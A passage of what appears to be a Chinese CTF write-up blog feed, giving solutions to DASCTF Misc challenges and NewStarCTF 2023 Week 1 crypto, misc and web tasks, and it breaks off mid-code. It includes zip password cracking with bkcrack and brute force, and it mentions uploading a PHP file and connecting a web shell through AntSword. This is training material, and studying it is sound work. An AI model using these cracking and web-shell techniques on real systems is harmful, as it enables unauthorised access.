class="hljs-string">&#x27;待解码音频包含&#x27;</span>, _100ms_count // <span class="hljs-number">2</span>, <span class="hljs-string">&#x27;个字&#x27;</span>)    <br><br>    ret = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, _100ms_count, <span class="hljs-number">2</span>):                <br>        index = <span class="hljs-number">0</span><br>        <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>):<br>            index = index*<span class="hljs-number">10</span> + dec_100ms(wav_data[i*SAMPLE_NUM + k*SAMPLE_NUM : i*SAMPLE_NUM + (k+<span class="hljs-number">1</span>)*SAMPLE_NUM])<br>        <br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;序号：&#x27;</span>, index)<br>        ret += string[index]<br><br>    <span class="hljs-keyword">return</span> ret<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;haha.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf8&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        string =  f.read()<br><br>    <span class="hljs-keyword">with</span> wave.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;嘘.wav&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:          <span class="hljs-comment">#读取为数组</span><br>        wav_data = np.frombuffer(f.readframes(-<span class="hljs-number">1</span>), dtype=np.int16)<br><br>    <span class="hljs-built_in">print</span>(dec_sentence(wav_data))<br></code></pre></td></tr></table></figure><p>运行得到flag</p><p><img src="/2023/10/23/DASCTF_X_CBCTF2023__%E6%97%A0%E7%95%8F%E8%80%85%E5%85%88%E8%A1%8C/1698147763017.png" alt="1698147763017"></p><h2 id="NoPasswd"><a href="#NoPasswd" class="headerlink" title="NoPasswd"></a>NoPasswd</h2><p>打开doc文件发现加密</p><p>查看属性发现宏孩儿和60290f0225011a72697f420d1f4e402778231b</p><p><img src="/2023/10/23/DASCTF_X_CBCTF2023__%E6%97%A0%E7%95%8F%E8%80%85%E5%85%88%E8%A1%8C/image-20231025162148326.png" alt="image-20231025162148326"></p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">oleid：分析OLE文件以检测通常在恶意文件中发现的特定特征。<br>olevba：从<span class="hljs-keyword">MS</span> <span class="hljs-title">Office</span>文档（OLE和OpenXML）中提取和分析VBA Macro源代码。<br>MacroRaptor：检测恶意的VBA宏<br>msodde：检测并从<span class="hljs-keyword">MS</span> <span class="hljs-title">Office</span>文档，RTF和CSV中提取DDE / DDEAUTO链接<br>pyxswf：检测，提取和分析可能嵌入在<span class="hljs-keyword">MS</span> <span class="hljs-title">Office</span>文档（例如Word，Excel）和RTF等文件中的Flash对象（SWF），这对于恶意软件分析特别有用。<br>oleobj：从OLE文件中提取嵌入式对象。<br>rtfobj：从RTF文件中提取嵌入式对象。<br></code></pre></td></tr></table></figure><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs vbnet"><span class="hljs-keyword">Sub</span> XOREncryptFile()<br>    <span class="hljs-keyword">Dim</span> numbers(<span class="hljs-number">8</span>) <span class="hljs-keyword">As</span> <span class="hljs-type">Integer</span><br><br>    numbers(<span class="hljs-number">0</span>) = <span class="hljs-number">19</span><br>    numbers(<span class="hljs-number">1</span>) = <span class="hljs-number">71</span><br>    numbers(<span class="hljs-number">2</span>) = <span class="hljs-number">122</span><br>    numbers(<span class="hljs-number">3</span>) = <span class="hljs-number">99</span><br>    numbers(<span class="hljs-number">4</span>) = <span class="hljs-number">65</span><br>    numbers(<span class="hljs-number">5</span>) = <span class="hljs-number">111</span><br>    numbers(<span class="hljs-number">6</span>) = <span class="hljs-number">43</span><br>    numbers(<span class="hljs-number">7</span>) = <span class="hljs-number">67</span><br><br><br>    <span class="hljs-keyword">Dim</span> CurrentDirectory <span class="hljs-keyword">As</span> <span class="hljs-type">String</span><br>    CurrentDirectory = <span class="hljs-string">&quot;.\&quot;</span><br><br>    <span class="hljs-keyword">If</span> Dir(CurrentDirectory &amp; <span class="hljs-string">&quot;abc&quot;</span>) = <span class="hljs-string">&quot;&quot;</span> <span class="hljs-keyword">Then</span><br>        <span class="hljs-keyword">Exit</span> <span class="hljs-keyword">Sub</span><br>    <span class="hljs-keyword">End</span> <span class="hljs-keyword">If</span><br><br>    <span class="hljs-keyword">Dim</span> FileNumber <span class="hljs-keyword">As</span> <span class="hljs-type">Integer</span><br>    FileNumber = FreeFile<br>    Open CurrentDirectory &amp; <span class="hljs-string">&quot;abc&quot;</span> <span class="hljs-keyword">For</span> <span class="hljs-keyword">Binary</span> Access Read Write <span class="hljs-keyword">As</span> #FileNumber<br><br>    <span class="hljs-keyword">Dim</span> FileContent <span class="hljs-keyword">As</span> <span class="hljs-type">String</span><br>    FileContent = Input$(LOF(FileNumber), #FileNumber)<br><br>    Close #FileNumber<br><br>    <span class="hljs-keyword">Dim</span> EncryptedContent <span class="hljs-keyword">As</span> <span class="hljs-type">String</span><br><br>    <span class="hljs-keyword">For</span> i = <span class="hljs-number">1</span> <span class="hljs-keyword">To</span> Len(FileContent)<br>        EncryptedContent = EncryptedContent &amp; Chr(Asc(<span class="hljs-keyword">Mid</span>(FileContent, i, <span class="hljs-number">1</span>)) <span class="hljs-built_in">Xor</span> numbers((i - <span class="hljs-number">1</span>) <span class="hljs-built_in">Mod</span> <span class="hljs-number">8</span>))<br>    <span class="hljs-keyword">Next</span> i<br><br>    FileNumber = FreeFile<br>    Open CurrentDirectory &amp; <span class="hljs-string">&quot;enc&quot;</span> <span class="hljs-keyword">For</span> <span class="hljs-keyword">Binary</span> Access Write <span class="hljs-keyword">As</span> #FileNumber<br><br>    Put #FileNumber, , EncryptedContent<br><br>    Close #FileNumber<br><br><span class="hljs-keyword">End</span> <span class="hljs-keyword">Sub</span><br></code></pre></td></tr></table></figure><p>分析一下可以知道就是简单的异或，enc应该就是备注中的16进制字符串，写个脚本解密一下可以得到doc的密码，解开doc可以发现base64字符串，解码一下可知是zip文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br>enc = long_to_bytes(<span class="hljs-number">0x60290f0225011a72697f420d1f4e402778231b</span>)<br>key = [<span class="hljs-number">19</span>,<span class="hljs-number">71</span>,<span class="hljs-number">122</span>,<span class="hljs-number">99</span>,<span class="hljs-number">65</span>,<span class="hljs-number">111</span>,<span class="hljs-number">43</span>,<span class="hljs-number">67</span>]<br><br>abc = <span class="hljs-string">&quot;&quot;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(enc)):<br>    abc += <span class="hljs-built_in">chr</span>(enc[i] ^ key[i%<span class="hljs-number">8</span>])<br><br><span class="hljs-built_in">print</span>(abc)<br></code></pre></td></tr></table></figure><p>解密得到一堆文字，可能是base64，cyberchef解密发现是zip，导出压缩包发现是伪加密</p><p><img src="/2023/10/23/DASCTF_X_CBCTF2023__%E6%97%A0%E7%95%8F%E8%80%85%E5%85%88%E8%A1%8C/1698223285560.png" alt="1698223285560"></p><p><img src="/2023/10/23/DASCTF_X_CBCTF2023__%E6%97%A0%E7%95%8F%E8%80%85%E5%85%88%E8%A1%8C/1698223316727.png" alt="1698223316727"></p><p>解压缩发现报png文件格式错误，说明压缩包里的是png，我们看看变量的数据</p><p>发现文件名应该是flag.png一共8个字节，但是变量那边的name长度只有4个字节，所以我们要改成8个字节</p><p><img src="/2023/10/23/DASCTF_X_CBCTF2023__%E6%97%A0%E7%95%8F%E8%80%85%E5%85%88%E8%A1%8C/1698223501672.png" alt="1698223501672"></p><p><img src="/2023/10/23/DASCTF_X_CBCTF2023__%E6%97%A0%E7%95%8F%E8%80%85%E5%85%88%E8%A1%8C/flag.png" alt="flag"></p><h2 id="SecretZip"><a href="#SecretZip" class="headerlink" title="SecretZip"></a>SecretZip</h2><p>题目给了一个key文件，以及一个加密的zip，key文件内其实是压缩包明文压缩后的前半部分，因此压缩包虽然不是store的压缩模式，也能进行已知部分明文攻击</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">bkcrack -C purezip<span class="hljs-selector-class">.zip</span> -c <span class="hljs-string">&#x27;secret key.zip&#x27;</span> -<span class="hljs-selector-tag">p</span> key<br></code></pre></td></tr></table></figure><p><img src="/2023/10/23/DASCTF_X_CBCTF2023__%E6%97%A0%E7%95%8F%E8%80%85%E5%85%88%E8%A1%8C/1698224924831.png" alt="1698224924831"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">e63af7cc</span> <span class="hljs-number">55</span>ef839d dc10b922<br></code></pre></td></tr></table></figure><p>解密的数据可能会被压缩，具体取决于创建 zip 文件时是否使用压缩。如果使用 deflate 压缩，则<code>tools</code>可以使用文件夹中提供的 Python 3 脚本来解压缩数据。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">bkcrack</span> -C purezip.zip -c &#x27;secret key.zip&#x27; -k e63af7cc <span class="hljs-number">55</span>ef839d dc10b922  -d <span class="hljs-number">01</span>_deflate<br><span class="hljs-attribute">python3</span> inflate.py &lt; <span class="hljs-number">01</span>_deflate &gt; <span class="hljs-number">01</span>.zip<br></code></pre></td></tr></table></figure><p><img src="/2023/10/23/DASCTF_X_CBCTF2023__%E6%97%A0%E7%95%8F%E8%80%85%E5%85%88%E8%A1%8C/1698245516530.png" alt="1698245516530"></p><p>01.zip在010查看发现提示密码是2字节</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> zipfile<br><span class="hljs-keyword">import</span> libnum<br><span class="hljs-keyword">from</span> tqdm <span class="hljs-keyword">import</span> trange<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> trange(<span class="hljs-number">256</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        fz = zipfile.ZipFile(<span class="hljs-string">&#x27;01.zip&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>)<br>        password = libnum.n2s(i) + libnum.n2s(j)<br>        <span class="hljs-keyword">try</span>:<br>            fz.extractall(pwd=password)<br>            <span class="hljs-built_in">print</span>(password)<br>            fz.close()<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">except</span>:<br>            fz.close()<br>            <span class="hljs-keyword">continue</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">continue</span><br>    <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><p><img src="/2023/10/23/DASCTF_X_CBCTF2023__%E6%97%A0%E7%95%8F%E8%80%85%E5%85%88%E8%A1%8C/1698245671552.png" alt="1698245671552"></p><p>解压出一个secret key.txt，里面内容<code>e48d3828 5b7223cc 71851fb0</code></p><p>同时在zpaq文件的文件尾得到提示the password is md5(the plaintext of the secret key which length is 3 bytes)</p><p>因此要还原pkzip的三段秘钥，但是发现bkcrack自带了秘钥还原的接口</p><p><img src="/2023/10/23/DASCTF_X_CBCTF2023__%E6%97%A0%E7%95%8F%E8%80%85%E5%85%88%E8%A1%8C/1698247609404.png" alt="1698247609404"></p><p><img src="/2023/10/23/DASCTF_X_CBCTF2023__%E6%97%A0%E7%95%8F%E8%80%85%E5%85%88%E8%A1%8C/1698247531170.png" alt="1698247531170"></p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns">bb9cceb294113270da5eaed<span class="hljs-number">47a545f55</span><br></code></pre></td></tr></table></figure><p>解压得到flag</p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF-wp-Misc</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>NewStarCTF2023</title>
    <link href="/2023/10/23/NewStarCTF2023/"/>
    <url>/2023/10/23/NewStarCTF2023/</url>
    
    <content type="html"><![CDATA[<h1 id="Week1"><a href="#Week1" class="headerlink" title="Week1"></a>Week1</h1><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="brainfuck"><a href="#brainfuck" class="headerlink" title="brainfuck"></a>brainfuck</h3><p>附件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python">++++++++[&gt;&gt;++&gt;++++&gt;++++++&gt;++++++++&gt;++++++++++&gt;++++++++++++&gt;++++++++++++++&gt;++++++++++++++++&gt;++++++++++++++++++&gt;++++++++++++++++++++&gt;++++++++++++++++++++++&gt;++++++++++++++++++++++++&gt;++++++++++++++++++++++++++&gt;++++++++++++++++++++++++++++&gt;++++++++++++++++++++++++++++++&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;&gt;&gt;&gt;++++++.&gt;----.&lt;-----.&gt;-----.&gt;-----.&lt;&lt;&lt;-.&gt;&gt;++..&lt;.&gt;.++++++.....------.&lt;.&gt;.&lt;&lt;&lt;&lt;&lt;+++.&gt;&gt;&gt;&gt;+.&lt;&lt;&lt;+++++++.&gt;&gt;&gt;+.&lt;&lt;&lt;-------.&gt;&gt;&gt;-.&lt;&lt;&lt;+.+++++++.--..&gt;&gt;&gt;&gt;---.-.&lt;&lt;&lt;&lt;-.+++.&gt;&gt;&gt;&gt;.&lt;&lt;&lt;&lt;-------.+.&gt;&gt;&gt;&gt;&gt;++.<br>a=<span class="hljs-built_in">input</span>()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">brainfuck</span>(<span class="hljs-params">a</span>):<br>    li = [<span class="hljs-number">0</span>]<br>    index = <span class="hljs-number">0</span><br>    kuo = []<br>    output = []<br>    i = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> i &lt; <span class="hljs-built_in">len</span>(a):<br>        <span class="hljs-keyword">if</span> a[i] == <span class="hljs-string">&#x27;+&#x27;</span> <span class="hljs-keyword">or</span> a[i] == <span class="hljs-string">&#x27;-&#x27;</span>:<br>            li[index] = <span class="hljs-built_in">eval</span>(<span class="hljs-built_in">str</span>(li[index]) + a[i] + <span class="hljs-string">&#x27;1&#x27;</span>)<br>        <span class="hljs-keyword">elif</span> a[i] == <span class="hljs-string">&#x27;&gt;&#x27;</span>:<br>            index += <span class="hljs-number">1</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(li) &lt;= index:<br>                li.append(<span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">elif</span> a[i] == <span class="hljs-string">&#x27;&lt;&#x27;</span>:<br>            index -= <span class="hljs-number">1</span><br>        <span class="hljs-keyword">elif</span> a[i] == <span class="hljs-string">&#x27;.&#x27;</span>:<br>            <span class="hljs-built_in">print</span>(li[index], end=<span class="hljs-string">&#x27; &#x27;</span>)<br>            output.append(li[index])<br>        <span class="hljs-keyword">elif</span> a[i] == <span class="hljs-string">&#x27;,&#x27;</span>:<br>            i += <span class="hljs-number">1</span><br>            li[index] = <span class="hljs-built_in">ord</span>(a[i])<br>        <span class="hljs-keyword">elif</span> a[i] == <span class="hljs-string">&#x27;[&#x27;</span>:<br>            <span class="hljs-keyword">if</span> li[index] == <span class="hljs-number">0</span>:<br>                <span class="hljs-keyword">while</span> a[i] != <span class="hljs-string">&#x27;]&#x27;</span>:<br>                    i += <span class="hljs-number">1</span><br>                i += <span class="hljs-number">1</span><br>            <span class="hljs-keyword">else</span>:<br>                kuo.append(i)<br>        <span class="hljs-keyword">elif</span> a[i] == <span class="hljs-string">&#x27;]&#x27;</span>:<br>            <span class="hljs-keyword">if</span> li[index] != <span class="hljs-number">0</span>:<br>                i = kuo.pop()-<span class="hljs-number">1</span><br>            <span class="hljs-keyword">else</span>:<br>                temp = kuo.pop()<br>        i += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> output<br><br>output = brainfuck(a)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> output:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(i), end=<span class="hljs-string">&#x27;&#x27;</span>)<br>flag&#123;Oiiaioooooiai<span class="hljs-comment">#b7c0b1866fe58e12&#125;</span><br></code></pre></td></tr></table></figure><h3 id="Caesar’s-Secert"><a href="#Caesar’s-Secert" class="headerlink" title="Caesar’s Secert"></a>Caesar’s Secert</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">kqfl&#123;hf3x4w&#x27;x_h1umjw_n5_a4wd_3fed&#125;<br>flag&#123;ca3s4r&#x27;s_c1pher_i5_v4ry_3azy&#125;<br></code></pre></td></tr></table></figure><h3 id="Fence"><a href="#Fence" class="headerlink" title="Fence"></a>Fence</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">fa&#123;ereigtepanet6680&#125;lgrodrn_h_litx#8fc3<br>flag&#123;reordering_the_plaintext#686f8c03&#125;<br></code></pre></td></tr></table></figure><h3 id="Vigenere"><a href="#Vigenere" class="headerlink" title="Vigenère"></a>Vigenère</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">pqcq&#123;qc_m1kt4_njn_5slp0b_lkyacx_gcdy1ud4_g3nv5x0&#125;<br></code></pre></td></tr></table></figure><p>大厨一个个试过去对应<code>pqc</code>-&gt;<code>fla</code></p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">flag&#123;la_c<span class="hljs-number">1</span>fr<span class="hljs-number">4</span>_del_<span class="hljs-number">5</span>ig<span class="hljs-symbol">n0</span>r_giova<span class="hljs-symbol">n_batt1</span>st<span class="hljs-number">4</span>_b<span class="hljs-number">3</span>ll<span class="hljs-number">5</span>s<span class="hljs-number">0</span>&#125;<br></code></pre></td></tr></table></figure><h3 id="babyencoding"><a href="#babyencoding" class="headerlink" title="babyencoding"></a>babyencoding</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plain">part 1 of flag: ZmxhZ3tkYXp6bGluZ19lbmNvZGluZyM0ZTBhZDQ=<br>part 2 of flag: MYYGGYJQHBSDCZJRMQYGMMJQMMYGGN3BMZSTIMRSMZSWCNY=<br>part 3 of flag: =8S4U,3DR8SDY,C`S-F5F-C(S,S&lt;R-C`Q9F8S87T`<br><br>part 1 base64 ：flag&#123;dazzling_encoding#4e0ad4<br>part 2 base32：f0ca08d1e1d0f10c0c7afe422fea7<br>part 3 uuencode：c55192c992036ef623372601ff3a&#125;<br></code></pre></td></tr></table></figure><p><code>convert_uudecode</code>函数解密</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$str</span> = <span class="hljs-string">&quot;=8S4U,3DR8SDY,C`S-F5F-C(S,S&lt;R-C`Q9F8S87T`&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">convert_undecode</span>(<span class="hljs-variable">$str</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><code>flag&#123;dazzling_encoding#4e0ad4f0ca08d1e1d0f10c0c7afe422fea7c55192c992036ef623372601ff3a&#125;</code></p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="CyberChef’s-Secret"><a href="#CyberChef’s-Secret" class="headerlink" title="CyberChef’s Secret"></a>CyberChef’s Secret</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">来签到吧！下面这个就是flag，不过它看起来好像怪怪的:-)<br>M5YHEUTEKFBW6YJWKZGU44CXIEYUWMLSNJLTOZCXIJTWCZD2IZRVG4TJPBSGGWBWHFMXQTDFJNXDQTA=<br></code></pre></td></tr></table></figure><p>大厨<code>flag&#123;Base_15_S0_Easy_^_^&#125;</code></p><h3 id="机密图片"><a href="#机密图片" class="headerlink" title="机密图片"></a>机密图片</h3><blockquote><p>小宝最近学会了隐写术，并且在图片中藏了一些秘密，你能发现他的秘密吗？</p></blockquote><p>steg，RGB000</p><p><code>flag&#123;W3lc0m3_t0_N3wSt4RCTF_2023_7cda3ece&#125;</code></p><h3 id="流量！鲨鱼！"><a href="#流量！鲨鱼！" class="headerlink" title="流量！鲨鱼！"></a>流量！鲨鱼！</h3><p>导出对象<code>http</code>一个个找</p><p><img src="/2023/10/23/NewStarCTF2023/1697985393564.png" alt="1697985393564"></p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gcode">W<span class="hljs-name">m14</span>aFozdFhjbWt<span class="hljs-number">6</span>Tld<span class="hljs-symbol">nMGNtdGZNWE5</span>mZFRVelpuV<span class="hljs-symbol">nNYMkkzTW1</span>FMk<span class="hljs-number">1</span>EazF<span class="hljs-symbol">NemRsTm4</span>wSwo=<br>flag&#123;Wri<span class="hljs-number">35</span>h<span class="hljs-number">4</span>rk_<span class="hljs-number">1</span>s_u<span class="hljs-number">53</span>ful_b<span class="hljs-number">72</span>a<span class="hljs-number">609537</span>e<span class="hljs-number">6</span>&#125;<br></code></pre></td></tr></table></figure><h3 id="压缩包们"><a href="#压缩包们" class="headerlink" title="压缩包们"></a>压缩包们</h3><p>拖进去发现是一个<code>zip</code>，提取出来</p><p><img src="/2023/10/23/NewStarCTF2023/1697985465863.png" alt="1697985465863"></p><p>发现是加密的，经过尝试不是<code>伪加密</code>，发现</p><p><code>SSBsaWtlIHNpeC1kaWdpdCBudW1iZXJzIGJlY2F1c2UgdGhleSBhcmUgdmVyeSBjb25jaXNlIGFuZCBlYXN5IHRvIHJlbWVtYmVyLg==</code></p><p>解密说要6位数字密码</p><p>爆破密码<code>232311</code></p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">flag</span><span class="hljs-template-variable">&#123;y0u_ar3_the_m4ter_of_z1111ppp_606a4adc&#125;</span><br></code></pre></td></tr></table></figure><h3 id="空白格"><a href="#空白格" class="headerlink" title="空白格"></a>空白格</h3><p><a href="https://vii5ard.github.io/whitespace/">Whitelips the Esoteric Language IDE</a></p><p><img src="/2023/10/23/NewStarCTF2023/1697985521954.png" alt="1697985521954"></p><h3 id="隐秘的眼睛"><a href="#隐秘的眼睛" class="headerlink" title="隐秘的眼睛"></a>隐秘的眼睛</h3><p>silenteye</p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="泄漏的秘密"><a href="#泄漏的秘密" class="headerlink" title="泄漏的秘密"></a>泄漏的秘密</h3><blockquote><p>粗心的网站管理员总会泄漏一些敏感信息在Web根目录下</p></blockquote><p>使用<code>dirmap</code>扫描，得到<a href="http://www.zip/">www.zip</a></p><p>下载得到index.php和robots.txt</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php">robots.txt：<br>PART ONE: flag&#123;r0bots_1s_s0_us3ful<br><br>index.php：<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$PART_TWO</span> = <span class="hljs-string">&quot;_4nd_www.zip_1s_s0_d4ng3rous&#125;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h1&gt;粗心的管理员泄漏了一些敏感信息，请你找出他泄漏的两个敏感信息！&lt;/h1&gt;&quot;</span><br></code></pre></td></tr></table></figure><h3 id="Begin-of-Upload"><a href="#Begin-of-Upload" class="headerlink" title="Begin of Upload"></a>Begin of Upload</h3><blockquote><p>普通的上传啦，平平淡淡才是真</p></blockquote><p>抓包，1.jpg改成1.php</p><p>蚁剑连接</p><h3 id="ErrorFlask"><a href="#ErrorFlask" class="headerlink" title="ErrorFlask"></a>ErrorFlask</h3><p>页面提示</p><p> give me number1 and number2,i will help you to add  </p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">?<span class="hljs-symbol">number1</span>=<span class="hljs-number">1</span>&amp;<span class="hljs-symbol">number2</span>=<span class="hljs-number">3</span><br></code></pre></td></tr></table></figure><p>回显 not ssti,flag in source code~3  </p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">?<span class="hljs-symbol">number1</span>=a&amp;<span class="hljs-symbol">number2</span>=<span class="hljs-number">3</span><br></code></pre></td></tr></table></figure><p><img src="/2023/10/23/NewStarCTF2023/image-20231022224604835.png" alt="image-20231022224604835"></p><h3 id="Begin-of-HTTP"><a href="#Begin-of-HTTP" class="headerlink" title="Begin of HTTP"></a>Begin of HTTP</h3><p>请使用 GET方式 来给 ctf 参数传入任意值来通过这关</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">ctf</span>=1<br></code></pre></td></tr></table></figure><p>很棒，如果我还想让你以POST方式来给我传递 secret 参数你又该如何处理呢?如果你传入的参数值并不是我想要的secret，我也不会放你过关的或许你可以找一找我把secret藏在了哪里</p><p>检查源代码</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span 